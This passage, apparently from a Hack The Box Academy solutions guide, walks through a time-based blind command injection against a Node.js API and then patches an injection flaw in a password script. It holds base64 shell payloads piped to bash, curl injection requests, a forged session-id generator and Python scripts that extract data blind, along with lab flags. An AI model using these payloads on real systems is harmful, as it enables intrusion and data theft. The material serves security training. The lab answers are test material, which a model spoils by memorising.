for i in {0..5}; do   echo -n "Character: $i    "; echo -n "cat /flag.txt | head -c 2 | tail -c 1 | { read c; if [ \$c = $i ]; then sleep 2; fi; }" | base64 -w0; echo \n; done
```

```
┌─[us-academy-1]─[10.10.15.254]─[htb-ac-594497@htb-tkodmhrqgu]─[~]
└──╼ [★]$ for i in {0..5}; do   echo -n "Character: $i    "; echo -n "cat /flag.txt | head -c 2 | tail -c 1 | { read c; if [ \$c = $i ]; then sleep 2; fi; }" | base64 -w0; echo \n; done

Character: 0    Y2F0IC9mbGFnLnR4dCB8IGhlYWQgLWMgMiB8IHRhaWwgLWMgMSB8IHsgcmVhZCBjOyBpZiBbICRjID0gMCBdOyB0aGVuIHNsZWVwIDI7IGZpOyB9n
Character: 1    Y2F0IC9mbGFnLnR4dCB8IGhlYWQgLWMgMiB8IHRhaWwgLWMgMSB8IHsgcmVhZCBjOyBpZiBbICRjID0gMSBdOyB0aGVuIHNsZWVwIDI7IGZpOyB9n
Character: 2    Y2F0IC9mbGFnLnR4dCB8IGhlYWQgLWMgMiB8IHRhaWwgLWMgMSB8IHsgcmVhZCBjOyBpZiBbICRjID0gMiBdOyB0aGVuIHNsZWVwIDI7IGZpOyB9n
Character: 3    Y2F0IC9mbGFnLnR4dCB8IGhlYWQgLWMgMiB8IHRhaWwgLWMgMSB8IHsgcmVhZCBjOyBpZiBbICRjID0gMyBdOyB0aGVuIHNsZWVwIDI7IGZpOyB9n
Character: 4    Y2F0IC9mbGFnLnR4dCB8IGhlYWQgLWMgMiB8IHRhaWwgLWMgMSB8IHsgcmVhZCBjOyBpZiBbICRjID0gNCBdOyB0aGVuIHNsZWVwIDI7IGZpOyB9n
Character: 5    Y2F0IC9mbGFnLnR4dCB8IGhlYWQgLWMgMiB8IHRhaWwgLWMgMSB8IHsgcmVhZCBjOyBpZiBbICRjID0gNSBdOyB0aGVuIHNsZWVwIDI7IGZpOyB9n
```

Students again need to test each payload against the remote web application:

Code: shell

```shell
time curl -s -X POST -H "Content-Type: application/json" -H "Authorization: bearer <token>" -d "{ \"text\": \"'}) + require('child_process').execSync('echo <base64 encoded payload> | base64 -d | bash')//\" }" http://STMIP:STMPO/api/service/generate
```

```
┌─[us-academy-1]─[10.10.15.254]─[htb-ac-594497@htb-tkodmhrqgu]─[~]
└──╼ [★]$ time curl -s -X POST -H "Content-Type: application/json" -H "Authorization: bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6InRlc3RAaGFja3RoZWJveC5jb20iLCJyb2xlIjoiYWRtaW4iLCJpYXQiOjE3MDEwNDE3ODIsImV4cCI6MTcwMTEyODE4Mn0.Ow17Rwy0NiFisOzEhNIosbv7pQYX2mPgw2oamoQijDA" -d "{ \"text\": \"'}) + require('child_process').execSync('echo Y2F0IC9mbGFnLnR4dCB8IGhlYWQgLWMgMiB8IHRhaWwgLWMgMSB8IHsgcmVhZCBjOyBpZiBbICRjID0gMCBdOyB0aGVuIHNsZWVwIDI7IGZpOyB9n | base64 -d | bash')//\" }" http://94.237.54.59:50504/api/service/generate

{"message":"Could not generate QR code."}
real	0m0.169s
user	0m0.005s
sys	0m0.001s
┌─[us-academy-1]─[10.10.15.254]─[htb-ac-594497@htb-tkodmhrqgu]─[~]
└──╼ [★]$ time curl -s -X POST -H "Content-Type: application/json" -H "Authorization: bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6InRlc3RAaGFja3RoZWJveC5jb20iLCJyb2xlIjoiYWRtaW4iLCJpYXQiOjE3MDEwNDE3ODIsImV4cCI6MTcwMTEyODE4Mn0.Ow17Rwy0NiFisOzEhNIosbv7pQYX2mPgw2oamoQijDA" -d "{ \"text\": \"'}) + require('child_process').execSync('echo Y2F0IC9mbGFnLnR4dCB8IGhlYWQgLWMgMiB8IHRhaWwgLWMgMSB8IHsgcmVhZCBjOyBpZiBbICRjID0gMSBdOyB0aGVuIHNsZWVwIDI7IGZpOyB9n | base64 -d | bash')//\" }" http://94.237.54.59:50504/api/service/generate

{"message":"Could not generate QR code."}
real	0m2.173s
user	0m0.004s
sys	0m0.003s
```

Students will find the number `1` is present in the second position of the flag.

Finally, students need generate the payloads to test for the number found in the third position of the flag:

Code: shell

```shell
for i in {0..5}; do   echo -n "Character: $i    "; echo -n "cat /flag.txt | head -c 3 | tail -c 1 | { read c; if [ \$c = $i ]; then sleep 2; fi; }" | base64 -w0; echo \n; done
```

```
┌─[us-academy-1]─[10.10.15.254]─[htb-ac-594497@htb-tkodmhrqgu]─[~]
└──╼ [★]$ for i in {0..5}; do   echo -n "Character: $i    "; echo -n "cat /flag.txt | head -c 3 | tail -c 1 | { read c; if [ \$c = $i ]; then sleep 2; fi; }" | base64 -w0; echo \n; done

Character: 0    Y2F0IC9mbGFnLnR4dCB8IGhlYWQgLWMgMyB8IHRhaWwgLWMgMSB8IHsgcmVhZCBjOyBpZiBbICRjID0gMCBdOyB0aGVuIHNsZWVwIDI7IGZpOyB9n
Character: 1    Y2F0IC9mbGFnLnR4dCB8IGhlYWQgLWMgMyB8IHRhaWwgLWMgMSB8IHsgcmVhZCBjOyBpZiBbICRjID0gMSBdOyB0aGVuIHNsZWVwIDI7IGZpOyB9n
Character: 2    Y2F0IC9mbGFnLnR4dCB8IGhlYWQgLWMgMyB8IHRhaWwgLWMgMSB8IHsgcmVhZCBjOyBpZiBbICRjID0gMiBdOyB0aGVuIHNsZWVwIDI7IGZpOyB9n
Character: 3    Y2F0IC9mbGFnLnR4dCB8IGhlYWQgLWMgMyB8IHRhaWwgLWMgMSB8IHsgcmVhZCBjOyBpZiBbICRjID0gMyBdOyB0aGVuIHNsZWVwIDI7IGZpOyB9n
Character: 4    Y2F0IC9mbGFnLnR4dCB8IGhlYWQgLWMgMyB8IHRhaWwgLWMgMSB8IHsgcmVhZCBjOyBpZiBbICRjID0gNCBdOyB0aGVuIHNsZWVwIDI7IGZpOyB9n
Character: 5    Y2F0IC9mbGFnLnR4dCB8IGhlYWQgLWMgMyB8IHRhaWwgLWMgMSB8IHsgcmVhZCBjOyBpZiBbICRjID0gNSBdOyB0aGVuIHNsZWVwIDI7IGZpOyB9n
```

Students need to again test each payload against the target:

Code: shell

```shell
time curl -s -X POST -H "Content-Type: application/json" -H "Authorization: bearer <token>" -d "{ \"text\": \"'}) + require('child_process').execSync('echo <base64 encoded payload> | base64 -d | bash')//\" }" http://STMIP:STMPO/api/service/generate
```

```
┌─[us-academy-1]─[10.10.15.254]─[htb-ac-594497@htb-tkodmhrqgu]─[~]
└──╼ [★]$ time curl -s -X POST -H "Content-Type: application/json" -H "Authorization: bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6InRlc3RAaGFja3RoZWJveC5jb20iLCJyb2xlIjoiYWRtaW4iLCJpYXQiOjE3MDEwNDE3ODIsImV4cCI6MTcwMTEyODE4Mn0.Ow17Rwy0NiFisOzEhNIosbv7pQYX2mPgw2oamoQijDA" -d "{ \"text\": \"'}) + require('child_process').execSync('echo Y2F0IC9mbGFnLnR4dCB8IGhlYWQgLWMgMyB8IHRhaWwgLWMgMSB8IHsgcmVhZCBjOyBpZiBbICRjID0gMCBdOyB0aGVuIHNsZWVwIDI7IGZpOyB9n | base64 -d | bash')//\" }" http://94.237.54.59:50504/api/service/generate

{"message":"Could not generate QR code."}
real	0m0.173s
user	0m0.008s
sys	0m0.000s

┌─[us-academy-1]─[10.10.15.254]─[htb-ac-594497@htb-tkodmhrqgu]─[~]
└──╼ [★]$ time curl -s -X POST -H "Content-Type: application/json" -H "Authorization: bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6InRlc3RAaGFja3RoZWJveC5jb20iLCJyb2xlIjoiYWRtaW4iLCJpYXQiOjE3MDEwNDE3ODIsImV4cCI6MTcwMTEyODE4Mn0.Ow17Rwy0NiFisOzEhNIosbv7pQYX2mPgw2oamoQijDA" -d "{ \"text\": \"'}) + require('child_process').execSync('echo Y2F0IC9mbGFnLnR4dCB8IGhlYWQgLWMgMyB8IHRhaWwgLWMgMSB8IHsgcmVhZCBjOyBpZiBbICRjID0gMSBdOyB0aGVuIHNsZWVwIDI7IGZpOyB9n | base64 -d | bash')//\" }" http://94.237.54.59:50504/api/service/generate

{"message":"Could not generate QR code."}
real	0m0.170s
user	0m0.003s
sys	0m0.003s

┌─[us-academy-1]─[10.10.15.254]─[htb-ac-594497@htb-tkodmhrqgu]─[~]
└──╼ [★]$ time curl -s -X POST -H "Content-Type: application/json" -H "Authorization: bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6InRlc3RAaGFja3RoZWJveC5jb20iLCJyb2xlIjoiYWRtaW4iLCJpYXQiOjE3MDEwNDE3ODIsImV4cCI6MTcwMTEyODE4Mn0.Ow17Rwy0NiFisOzEhNIosbv7pQYX2mPgw2oamoQijDA" -d "{ \"text\": \"'}) + require('child_process').execSync('echo Y2F0IC9mbGFnLnR4dCB8IGhlYWQgLWMgMyB8IHRhaWwgLWMgMSB8IHsgcmVhZCBjOyBpZiBbICRjID0gMiBdOyB0aGVuIHNsZWVwIDI7IGZpOyB9n | base64 -d | bash')//\" }" http://94.237.54.59:50504/api/service/generate

{"message":"Could not generate QR code."}
real	0m0.169s
user	0m0.006s
sys	0m0.000s

┌─[us-academy-1]─[10.10.15.254]─[htb-ac-594497@htb-tkodmhrqgu]─[~]
└──╼ [★]$ time curl -s -X POST -H "Content-Type: application/json" -H "Authorization: bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6InRlc3RAaGFja3RoZWJveC5jb20iLCJyb2xlIjoiYWRtaW4iLCJpYXQiOjE3MDEwNDE3ODIsImV4cCI6MTcwMTEyODE4Mn0.Ow17Rwy0NiFisOzEhNIosbv7pQYX2mPgw2oamoQijDA" -d "{ \"text\": \"'}) + require('child_process').execSync('echo Y2F0IC9mbGFnLnR4dCB8IGhlYWQgLWMgMyB8IHRhaWwgLWMgMSB8IHsgcmVhZCBjOyBpZiBbICRjID0gMyBdOyB0aGVuIHNsZWVwIDI7IGZpOyB9n | base64 -d | bash')//\" }" http://94.237.54.59:50504/api/service/generate

{"message":"Could not generate QR code."}
real	0m0.171s
user	0m0.003s
sys	0m0.003s

┌─[us-academy-1]─[10.10.15.254]─[htb-ac-594497@htb-tkodmhrqgu]─[~]
└──╼ [★]$ time curl -s -X POST -H "Content-Type: application/json" -H "Authorization: bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6InRlc3RAaGFja3RoZWJveC5jb20iLCJyb2xlIjoiYWRtaW4iLCJpYXQiOjE3MDEwNDE3ODIsImV4cCI6MTcwMTEyODE4Mn0.Ow17Rwy0NiFisOzEhNIosbv7pQYX2mPgw2oamoQijDA" -d "{ \"text\": \"'}) + require('child_process').execSync('echo Y2F0IC9mbGFnLnR4dCB8IGhlYWQgLWMgMyB8IHRhaWwgLWMgMSB8IHsgcmVhZCBjOyBpZiBbICRjID0gNCBdOyB0aGVuIHNsZWVwIDI7IGZpOyB9n | base64 -d | bash')//\" }" http://94.237.54.59:50504/api/service/generate

{"message":"Could not generate QR code."}
real	0m2.171s
user	0m0.001s
sys	0m0.005s
```

At last, students will confirm that the number found in the third position of the flag is `4`. Therefore, the full contents of the flag reads `214`.

Answer: `214`

# Exploit Development

## Question 1

### "This exercise is the same one we have been testing, but it always returns a generic error message, so you cannot inject the command output in the response. Use what you learned in this section to write an exploit that automates the time-based blind exploitation process we covered in the previous section to read the flag at /flag.txt. Hint: The flag starts with HTB{, so you can use this as a measure of accuracy, and increase the sleep amount if your script misses some characters."

Students need to write a proof-of-concept script to perform a command injection attack against the server. The script must first authenticate with the server to obtain an admin token, then enter an infinite loop where it takes user input for a command to inject. Performing blind exfiltration, the script needs to gradually build and send payloads to the server character by character, trying to determine the correct character one at a time by measuring the server's response time. When it successfully identifies a character, it appends it to the output, and the loop continues to guess the next character until the command is complete, printing the flag.

Students need to use the following script to accomplish these tasks:

Code: python

```python
import requests
import json

# set server and port
server = "STMIP"
port = STMPO
url = f"http://{server}:{port}"
auth_endpoint = f"{url}/api/auth/authenticate"
qr_endpoint = f"{url}/api/service/generate"

# set headers and data for authentication
headers = {"Content-Type": "application/json"}
data = {"email": "test@hackthebox.com"}

# Get admin token
response = requests.post(auth_endpoint, headers=headers, data=json.dumps(data))
token = response.json()['token']

while True:
    # Get input command from user input
    user_input = input("\n> ")
    user_input = user_input.replace("'", '"')
    i = 0

    while True:
        i += 1
        # loop over entire printable ASCII
        for j in range(32, 127):
            # inject command into payload
            payload = {
                "text": "'}) + require('child_process').execSync('" + user_input + " | head -c " + str(i) + " | tail -c 1 | { read c; if [ \"$c\" = \"" + chr(j) + "\" ]; then sleep 2; fi; }')//"}

            # escape backslashes
            payload = json.dumps(payload).replace("\\\\", "\\\\\\")

            # send payload to server
            headers = {"Content-Type": "application/json",
                       "Authorization": f"Bearer {token}"}
            response = requests.post(
                qr_endpoint, headers=headers, data=payload)

            # check if response took 2 seconds or more
            if response.elapsed.total_seconds() >= 2:
                # print character and break loop
                print(chr(j), end="", flush=True)
                break
        else:
            # if no character was found, break loop
            break
```

Students need to run the script and enter `cat /flag.txt` at the prompt:

Code: shell

```shell
python3 poc.py
cat /flag.txt
```

```
┌─[us-academy-1]─[10.10.15.254]─[htb-ac-594497@htb-vtdwe0k8n4]─[~]
└──╼ [★]$ python3 poc.py 

> cat /flag.txt
HTB{!nj3c7_!n_7#3_d4rk}
```

After several minutes, students will see the complete flag printed to their terminal.

Answer: `HTB{!nj3c7_!n_7#3_d4rk}`

# Skills Assessment

## Question 1

### "Download the attached archive and apply the whitebox pentesting process you learned throughout this module to identify as many vulnerabilities as you can, and then use any of them to read the flag at /flag.txt."

Students need to first download and unzip the attached `skills_assessment.zip` archive:

Code: shell

```shell
wget https://academy.hackthebox.com/storage/modules/244/skills_assessment.zip && unzip skills_assessment.zip
```

```
┌─[us-academy-1]─[10.10.15.254]─[htb-ac-594497@htb-01rwd4giir]─[~]
└──╼ [★]$ wget https://academy.hackthebox.com/storage/modules/244/skills_assessment.zip && unzip skills_assessment.zip

--2023-11-27 20:06:33--  https://academy.hackthebox.com/storage/modules/244/skills_assessment.zip
Resolving academy.hackthebox.com (academy.hackthebox.com)... 104.18.20.126, 104.18.21.126, 2606:4700::6812:147e, ...
Connecting to academy.hackthebox.com (academy.hackthebox.com)|104.18.20.126|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 4947 (4.8K) [application/zip]
Saving to: ‘skills_assessment.zip’

skills_assessment.zip                           100%[====================================================================================================>]   4.83K  --.-KB/s    in 0s      

2023-11-27 20:06:33 (85.6 MB/s) - ‘skills_assessment.zip’ saved [4947/4947]

Archive:  skills_assessment.zip
   creating: skills_assessment/
  inflating: skills_assessment/package.json  
   creating: skills_assessment/.vscode/
  inflating: skills_assessment/.vscode/launch.json  
   creating: skills_assessment/src/
   creating: skills_assessment/src/controllers/
  inflating: skills_assessment/src/controllers/auth-controllers.js  
  inflating: skills_assessment/src/controllers/service-controllers.js  
   creating: skills_assessment/src/routes/
  inflating: skills_assessment/src/routes/service-routes.js  
  inflating: skills_assessment/src/routes/auth-routes.js  
  inflating: skills_assessment/src/app.js  
```

Next, students need to navigate inside the `skills_assessment` directory and install the required packages with `npm`:

Code: shell

```shell
cd skills_assessment/
npm install
```

```
┌─[us-academy-1]─[10.10.15.254]─[htb-ac-594497@htb-01rwd4giir]─[~]
└──╼ [★]$ cd skills_assessment/

┌─[us-academy-1]─[10.10.15.254]─[htb-ac-594497@htb-01rwd4giir]─[~/skills_assessment]
└──╼ [★]$ npm install

added 167 packages, and audited 168 packages in 5s

17 packages are looking for funding
  run \`npm fund\` for details

found 0 vulnerabilities
```

Subsequently, students need to begin the process of code review, opening the contents of the `skills_assessment` directory with `Visual Studio Code`:

Code: shell

```shell
code .
```

```
┌─[us-academy-1]─[10.10.15.254]─[htb-ac-594497@htb-01rwd4giir]─[~/skills_assessment]
└──╼ [★]$ code .
```

Students need to first inspect the contents of the `src/controllers/auth-controllers.js` file. Here, students need to determine the capability of the `verifySid` function and consequently how it can be used to authenticate:

Code: js

```js
// verify sid based on uid
function verifySid(uid, sid) {
  if (!sid) {
    throw new Error("Please provide a valid secret id.");
  }

  // sid format: uid + random characters + checksum
  const uidLength = uid.length;
  const sidLength = sid.length;
  const checksumLength = 2;
  const randomLength = 10;

  if (sidLength < uidLength + randomLength + checksumLength) {
    throw new Error("Please provide a valid secret id.");
  }

  const random = sid.substring(uidLength, uidLength + randomLength);
  const checksum = sid.substring(uidLength + randomLength);

  // verify checksum
  const calculatedChecksum = random
    .split("")
    .reduce((acc, curr) => acc + curr.charCodeAt(0), 0)
    .toString(16);

  if (calculatedChecksum !== checksum) {
    throw new Error("Please provide a valid secret id.");
  }

  return true;
}
```

The `verifySid` function validates a 'secret id' (sid) based on a 'user id' (uid). It checks that the sid has the correct format: uid followed by a random string and a checksum. The checksum is calculated from the random string's ASCII values and compared against the provided checksum in the sid. If the sid is not in the correct format or if the checksums don't match, it throws an error, indicating an invalid sid. This ensures that the sid is not just a random string but follows a specific structure for validation.

Students need to reverse and reuse the `verifySid` function to generate a sid, as follows:

Code: js

```js
// file saved as generateSid.js
const uid = "1";
const uidLength = uid.length;
const checksumLength = 2;
const randomLength = 10;

const random = Math.random()
  .toString(36)
  .substring(2, 2 + randomLength);

const checksum = random
  .split("")
  .reduce((acc, curr) => acc + curr.charCodeAt(0), 0)
  .toString(16);

const sid = uid + random + checksum;

console.log(sid);
```

Code: shell

```shell
node generateSid.js 
```

```
┌─[us-academy-1]─[10.10.15.254]─[htb-ac-594497@htb-01rwd4giir]─[~/skills_assessment]
└──╼ [★]$ node generateSid.js 

1d1dcd9jbmi39b
```

Having generated a sid, students need to test locally to ensure they that it returns a valid authentication token. Therefore, students need to return to `Visual Studio Code` and start the web application by going to `Run and Debug` -> `Launch Program` :

![[HTB Solutions/CWEE/z. images/cae13b748d123302ad449c98694004ec_MD5.webp]]

Then, students need to send a POST request to `/api/auth/authenticate`, including the previously generated uid and sid, so they may receive a valid authentication token:

Code: shell

```shell
curl -X POST http://localhost:5000/api/auth/authenticate -H "Content-Type: application/json" -d '{"uid":"1", "sid":"<generated sid>"}'
```

```
┌─[us-academy-1]─[10.10.15.254]─[htb-ac-594497@htb-5kfh5qltzn]─[~/skills_assessment]
└──╼ [★]$ curl -X POST http://localhost:5000/api/auth/authenticate -H "Content-Type: application/json" -d '{"uid":"1", "sid":"1d1dcd9jbmi39b"}'

{"token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1aWQiOiIxIiwiaWF0IjoxNzAxMTkxNTMzLCJleHAiOjE3MDEyNzc5MzN9.a9gyocBkhBW1p3xhUCD65B0C8O4-I-rywj221RMighI"}
```

Having successfully authenticated, students need to continue their code review to identify potentially vulnerable functions. Students need to inspect the contents of the `src/controllers/service-controllers.js` file; of particular interest is the `ping` function:

Code: js

```js
async function ping(req, res, next) {
  const { external, ip } = req.body;

  try {
    child_process.execFile(
      "ping",
      [
        "-c 1",
        external === "true"
          ? eval(\`uip = JSON.parse('${ip}').ip\`) && uip !== "undefined"
            ? uip
            : "127.0.0.1"
          : "127.0.0.1",
      ],
      function (error, stdout) {
        res.send(stdout);
      }
    );
  } catch (e) {
    return next({
      message: "Could not execute command.",
      statusCode: 500,
    });
  }
}
```

This asynchronous function is designed to handle a request for pinging a specific IP address. It extracts the `external` and `ip` properties from the request's body. Depending on the value of the `external` property, it either uses the provided `ip` value (parsed from JSON) or defaults to "127.0.0.1" if no valid IP is provided. The intended use of the `/api/service/ping` endpoint will appear as follows:

Code: shell

```shell
curl -X POST http://localhost:5000/api/service/ping -H "Content-Type: application/json" -H "Authorization: bearer <token>" -d '{"external": "true", "ip": "{\"ip\":\"8.8.8.8\"}"}'
```

```
┌─[us-academy-1]─[10.10.15.254]─[htb-ac-594497@htb-5kfh5qltzn]─[~/skills_assessment]
└──╼ [★]$ curl -X POST http://localhost:5000/api/service/ping -H "Content-Type: application/json" -H "Authorization: bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1aWQiOiIxIiwiaWF0IjoxNzAxMTkxNTMzLCJleHAiOjE3MDEyNzc5MzN9.a9gyocBkhBW1p3xhUCD65B0C8O4-I-rywj221RMighI" -d '{"external": "true", "ip": "{\"ip\":\"8.8.8.8\"}"}'

PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
64 bytes from 8.8.8.8: icmp_seq=1 ttl=121 time=1.02 ms

--- 8.8.8.8 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 1.023/1.023/1.023/0.000 ms
```

The function also happens to take the user's input and place it within `eval`, presenting a vulnerability. To reach the vulnerable part of the function, `external` needs to be set to `true`. To exploit the vulnerability, the code must be working up to the injection point. Therefore, students need to send a payload starting with starting with `{}');` for it to be `uip = JSON.parse('{}');` followed by the command to be injected:

Code: json

```json
{"external": "true", "ip": "{}'); require('child_process').execSync('<command>')//"}
```

Students need to test locally, utilizing a `sleep` command to see if the command injection is working successfully. Subsequently, students need to save the following payload to a text file (in this example, it will be referred to as `data.txt`):

Code: shell

```shell
cat << EOF > data.txt
{"external": "true", "ip": "{}'); require('child_process').execSync('sleep 2')//"}
EOF
```

```
┌─[us-academy-1]─[10.10.15.254]─[htb-ac-594497@htb-5kfh5qltzn]─[~/skills_assessment]
└──╼ [★]$ cat << EOF > data.txt
> {"external": "true", "ip": "{}'); require('child_process').execSync('sleep 2')//"}
> EOF
```

Now, students need to make a POST request to the `/api/service/ping` endpoint, prepending the request with the `time` command while specifying the `data.txt` file as the data to be sent:

Code: shell

```shell
time curl -X POST http://localhost:5000/api/service/ping -H "Content-Type: application/json" -H "Authorization: bearer <token>" -d @data.txt 
```

```
┌─[us-academy-1]─[10.10.15.254]─[htb-ac-594497@htb-5kfh5qltzn]─[~/skills_assessment]
└──╼ [★]$ time curl -X POST http://localhost:5000/api/service/ping -H "Content-Type: application/json" -H "Authorization: bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1aWQiOiIxIiwiaWF0IjoxNzAxMTkxNTMzLCJleHAiOjE3MDEyNzc5MzN9.a9gyocBkhBW1p3xhUCD65B0C8O4-I-rywj221RMighI" -d @data.txt 

real	0m2.038s
user	0m0.009s
sys	0m0.005s
```

Now armed with a working command injection, students need to move to the proof-of-concept phase, with the goal of retrieving the flag from the remote server. Students need to create a modified version of the script used in the `Exploit Development` section, again using blind exfiltration to extract the contents of the flag:

Code: python

```python
import requests
import json

# set server and port
server = "STMIP"
port = STMPO
url = f"http://{server}:{port}"
auth_endpoint = f"{url}/api/auth/authenticate"
qr_endpoint = f"{url}/api/service/ping"

# set headers and data for authentication
headers = {"Content-Type": "application/json"}
data = {"uid": "1", "sid": "1tmrka8x2c4398"}  # sid generated by sid_gen.js

# Get admin token
response = requests.post(auth_endpoint, headers=headers, data=json.dumps(data))
token = response.json()['token']

while True:
    # Get input command from user input
    user_input = input("\n> ")
    user_input = user_input.replace("'", '"')
    i = 0

    while True:
        i += 1
        # loop over entire printable ASCII
        for j in range(32, 127):
            # inject command into payload
            payload = {"external": "true",
                       "ip": "{}'); require('child_process').execSync('" + user_input + " | head -c " + str(i) + " | tail -c 1 | { read c; if [ \"$c\" = \"" + chr(j) + "\" ]; then sleep 2; fi; }')//"}

            # escape backslashes
            payload = json.dumps(payload).replace("\\\\", "\\\\\\")

            # send payload to server
            headers = {"Content-Type": "application/json",
                       "Authorization": f"Bearer {token}"}
            response = requests.post(
                qr_endpoint, headers=headers, data=payload)

            # check if response took 2 seconds or more
            if response.elapsed.total_seconds() >= 2:
                # print character and break loop
                print(chr(j), end="", flush=True)
                break
        else:
            # if no character was found, break loop
            break
```

Students need to run the script and enter `cat /flag.txt` at the prompt:

Code: shell

```shell
python3 poc.py
cat /flag.txt
```

```
┌─[us-academy-1]─[10.10.15.254]─[htb-ac-594497@htb-5kfh5qltzn]─[~/skills_assessment]
└──╼ [★]$ python3 poc.py 

> cat /flag.txt
HTB{m4573r_c0mm4nd3r_!nj3c70r}
```

Answer: `HTB{m4573r_c0mm4nd3r_!nj3c70r}`

# Skills Assessment

## Question 2

### "The attached archive contains a basic script that may be vulnerable. Try to identify as many vulnerabilities as you can and patch them. Then, visit /patch and paste the patched script to get the flag, or to know what you have missed."

Students need to first download and unzip the attached `skills_assessment_patching.zip` archive:

Code: shell

```shell
wget https://academy.hackthebox.com/storage/modules/244/skills_assessment_patching.zip && unzip skills_assessment_patching.zip
```

```
┌─[us-academy-1]─[10.10.15.254]─[htb-ac-594497@htb-vtdwe0k8n4]─[~]
└──╼ [★]$ wget https://academy.hackthebox.com/storage/modules/244/skills_assessment_patching.zip && unzip skills_assessment_patching.zip

--2023-11-27 16:31:15--  https://academy.hackthebox.com/storage/modules/244/skills_assessment_patching.zip
Resolving academy.hackthebox.com (academy.hackthebox.com)... 104.18.20.126, 104.18.21.126, 2606:4700::6812:147e, ...
Connecting to academy.hackthebox.com (academy.hackthebox.com)|104.18.20.126|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 611 [application/zip]
Saving to: ‘skills_assessment_patching.zip’

skills_assessment_patching.zip                  100%[====================================================================================================>]     611  --.-KB/s    in 0s      

2023-11-27 16:31:15 (12.0 MB/s) - ‘skills_assessment_patching.zip’ saved [611/611]

Archive:  skills_assessment_patching.zip
  inflating: pwgen.js      
```

Next, students need to perform code review, opening the `pwgen.js` file with `Visual Studio Code`:

Code: shell

```shell
code pwgen.js 
```

```
┌─[us-academy-1]─[10.10.15.254]─[htb-ac-594497@htb-vtdwe0k8n4]─[~]
└──╼ [★]$ code pwgen.js 
```

Code: js

```js
var length = process.argv[2];
var type = process.argv[3];

if (length === undefined || type === undefined) {
  console.log("usage: node pwgen.js <length> <type>");
  console.log("length: integer between 8 and 128");
  console.log("type: simple or complex");
}

function generatePassword(length, type) {
  let password = "";
  let characters =
    type === "simple"
      ? "abcdefghijklmnopqrstuvwxyz"
      : "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890!@#$%^&*()";

  for (let i = 0; i < length; i++) {
    password += characters.charAt(
      Math.floor(Math.random() * characters.length)
    );
  }

  new Function(
    \`console.log("${type} password - length ${length}: ${password}")\`
  )();
}

try {
  generatePassword(length, type);
} catch (e) {
  console.log(e);
}

module.exports = {
  generatePassword,
};
```

The script generates a random password based on the specified length and type. It takes two command-line arguments: `length` (an integer between 8 and 128) and `type` (either "simple" or "complex"). If the script is executed without these arguments, it provides usage instructions:

```
┌─[us-academy-1]─[10.10.15.254]─[htb-ac-594497@htb-vtdwe0k8n4]─[~]
└──╼ [★]$ node pwgen.js 

usage: node pwgen.js <length> <type>
length: integer between 8 and 128
type: simple or complex
undefined password - length undefined: 
```

Depending on the `type` argument, it selects a set of characters to create the password. If "simple" is chosen, the password includes lowercase letters only. If "complex" is chosen, the password includes lowercase letters, uppercase letters, digits, and special characters. The script then generates a random password of the specified length and prints it to the console:

```
┌─[us-academy-1]─[10.10.15.254]─[htb-ac-594497@htb-vtdwe0k8n4]─[~]
└──╼ [★]$ node pwgen.js 20 complex

complex password - length 20: X#Vmcz5dXTGHoqQ!@rlz
```

To begin patching, students need to first replace the use of `new Function` inside the `generatePassword` function with a simple `console.log`:

```js
function generatePassword(length, type) {
  let password = "";
  let characters =
    type === "simple"
      ? "abcdefghijklmnopqrstuvwxyz"
      : "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890!@#$%^&*()";

  for (let i = 0; i < length; i++) {
    password += characters.charAt(
      Math.floor(Math.random() * characters.length)
    );
  }

  console.log(\`${type} password - length ${length}: ${password}\`);
}
```

Next, students need to add functions that sanitize the `length` and `type` arguments:

```js
function sanitizeLength(length) {
  return length.replace(/[^0-9]/g, "");
}

function sanitizeType(type) {
  return type.replace(/[^a-z]/g, "");
}
```

Subsequently, students need to implement functions to validate that the `length` is a number between 8 and 128, and that the `type` is either "simple" or "complex":

```js
function validateLength(length) {
  if (isNaN(length)) {
    throw "length must be an integer";
  } else if (length < 8) {
    throw "password too short";
  } else if (length > 128) {
    throw "password too long";
  } else {
    return true;
  }
}

function validateType(type) {
  if (/^(simple|complex)$/.test(type) === false) {
    throw "type must be simple or complex";
  } else {
    return true;
  }
}
```

Lastly students need to modify the `try` block to include these newly added functions:

```js
try {
  length = sanitizeLength(length);
  type = sanitizeType(type);
  validateLength(length);
  validateType(type);

  generatePassword(length, type);
} catch (e) {
  console.log(e);
}
```

Therefore, the final version of the patched script will appear as follows:

```js
var length = process.argv[2];
var type = process.argv[3];

if (length === undefined || type === undefined) {
  console.log("usage: node pwgen.js <length> <type>");
  console.log("length: integer between 8 and 128");
  console.log("type: simple or complex");
}

function generatePassword(length, type) {
  let password = "";
  let characters =
    type === "simple"
      ? "abcdefghijklmnopqrstuvwxyz"
      : "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890!@#$%^&*()";

  for (let i = 0; i < length; i++) {
    password += characters.charAt(
      Math.floor(Math.random() * characters.length)
    );
  }

  console.log(\`${type} password - length ${length}: ${password}\`);
}

function sanitizeLength(length) {
  return length.replace(/[^0-9]/g, "");
}

function sanitizeType(type) {
  return type.replace(/[^a-z]/g, "");
}

function validateLength(length) {
  if (isNaN(length)) {
    throw "length must be an integer";
  } else if (length < 8) {
    throw "password too short";
  } else if (length > 128) {
